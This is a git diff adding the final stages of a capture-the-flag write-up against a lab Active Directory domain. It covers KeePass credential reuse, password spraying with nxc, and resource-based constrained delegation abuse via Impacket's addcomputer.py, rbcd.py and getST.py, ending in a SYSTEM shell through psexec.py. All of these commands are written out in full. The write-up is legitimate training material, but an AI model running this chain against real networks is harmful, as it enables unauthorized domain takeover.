@@ -109,5 +109,74 @@ We extract the crackable hash using keepass2john and then use john. The hash cou
  john --wordlist=/usr/share/wordlists/rockyou.txt kdbx_hash.txt
 ```
 
-We therefore resorted to checking whether we could find anything related to keepass within the system and we came across a KeePass app.
+We therefore resorted to checking whether we could find anything related to keepass within the system and we came across a KeePass app. The app allows us to login with the current windows account just by clicking OK without a need for a master password.&#x20;
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-11-26 192124.png" alt=""><figcaption></figcaption></figure>
+
+Inside we get t.jones as the help desk. We will use the command runas to login as t.jones and see whether he has any interesting files within his directory but get nothing. Checking the bloodhound for groups that he might be in and unfortunately nothing interesting pops up from his account.
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-11-26 200333.png" alt=""><figcaption></figcaption></figure>
+
+We then tried to resort to Password Spraying. Using the password that we got we shall try to password spray across usernames that we will derive. We will use nxc for this using the smb protocol against t.jones and save the usernames into a  users file.
+
+```
+// nxc smb 10.113.172.120 -u 't.jones' -p 'REDACTED' --rid | grep "SidTypeUser" | awk -F '\\\\' '{print $2}' | awk '{print $1}' > users
+```
+
+Using the users file we created we will try password spraying using the credentials got from the Database.kdbx for the user t.jones who is a Help Desk.&#x20;
+
+```
+// nxc smb 10.113.172.120 -u users.txt -p 'REDACTED' --continue-on-success
+```
+
+<figure><img src="../.gitbook/assets/Untitled Design.png" alt=""><figcaption></figcaption></figure>
+
+Upon discovery we discovered that the user r.williams to uses the same password as t.jones. We therefore head to bloodhound and enumerate the user r.williams.&#x20;
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-11-26 201722.png" alt=""><figcaption></figcaption></figure>
+
+Checking the user's outbound Object Control we find that he has msDS-AllowedToActOnBehalfOfOtherIdentity attribute. We can abuse this and define a principal that we can allow to impersonate when authenticating to that resource.&#x20;
+
+`More information on this attribute can be found in my deep analysis writeups` &#x20;
+
+
+
+Road to Administrator's Flag
+
+R.wiliiams does not control an account with an SPN, therefore we can spawn a new attacker controlled computer account that can be added with Impackets addcomputer.py.
+
+`addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Pwned' -dc-host DC01 -no-add -domain-netbios ctf.local 'ctf.local/r.williams:REDACTED'`
+
+<figure><img src="../.gitbook/assets/2fe90503-752c-47e0-9a0c-3405ac71d08c.png" alt=""><figcaption></figcaption></figure>
+
+We now need to configure the target object so that the attacker controlled computer can delegate to it. We will use Impackets rbcd.py.
+
+```
+// /usr/share/doc/python3-impacket/examples/rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC01$' -action 'write' 'ctf.local/r.williams:REDACTED'
+
+```
+
+<figure><img src="../.gitbook/assets/66da70fd-6ea6-4b1c-9468-1aed551921ea.png" alt=""><figcaption></figcaption></figure>
+
+Finally we can get a service ticket for the service name we want to pretend to be. In our case we will impersonate Administrator. We will use Impacket's getST.py.&#x20;
+
+```
+// getST.py -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/ATTACKERSYSTEM$:Pwned' 
+```
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-11-26 205622.png" alt=""><figcaption></figcaption></figure>
+
+We have a ticket saved as Administrator@cifs\_DC01.ctf.local@CTF.LOCAL.ccache. We shall then export and set our ticekt to KRB5CCNAME kerberos environment variable.&#x20;
+
+```
+// export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache 
+```
+
+Finally we can use psexec.py to spawn an interactive SYSTEM-level shell using our cached kerberos ticket as Administrator. We can then find our flag but moving to the Administrator's desktop folder.
+
+```
+// psexec.py -k -no-pass -dc-ip 10.113.172.120 DC01.ctf.local  
+```
+
+<figure><img src="../.gitbook/assets/cc928fe6-c5d7-4a03-aa22-0015acb03e6b.png" alt=""><figcaption></figcaption></figure>
 
